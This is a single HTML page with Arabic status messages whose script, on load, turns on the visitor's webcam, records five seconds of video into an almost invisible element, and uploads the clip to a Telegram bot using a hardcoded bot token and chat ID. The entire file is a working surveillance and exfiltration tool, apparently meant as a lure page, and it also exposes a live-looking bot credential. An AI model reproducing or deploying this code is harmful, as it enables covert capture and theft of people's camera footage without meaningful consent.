<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎥 جاري التسجيل...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      font-family: sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    #status {
      font-size: 20px;
    }
    video {
      position: absolute;
      width: 10px;
      height: 10px;
      top: 0;
      left: 0;
      opacity: 0.01;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div id="status">🎥 جاري تسجيل الفيديو...</div>

  <video id="video" autoplay playsinline muted></video>

  <script>
    const chat_id = "6908826896";
    const token = "8216581015:AAFEu3XEvT2jePOMdSU8OYP9olix4JNzfk4";

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        const video = document.getElementById("video");
        video.srcObject = stream;

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: "video/mp4" });
          stream.getTracks().forEach(t => t.stop());

          const formData = new FormData();
          formData.append("chat_id", chat_id);
          formData.append("video", blob, "video.mp4");

          fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
            method: "POST",
            body: formData
          }).then(r => r.json()).then(d => {
            document.getElementById("status").innerText = d.ok
              ? "✅ تم إرسال الفيديو!"
              : "❌ فشل في الإرسال.";
          }).catch(err => {
            document.getElementById("status").innerText = "❌ خطأ في الاتصال.";
          });
        };

        recorder.start();
        document.getElementById("status").innerText = "⏺️ جاري التسجيل...";

        // سجّل لمدة 5 ثواني فقط
        setTimeout(() => {
          recorder.stop();
        }, 5000);

      } catch (err) {
        document.getElementById("status").innerText = "❌ فشل في تشغيل الكاميرا.";
      }
    }

    window.onload = startRecording;
  </script>
</body>
</html>
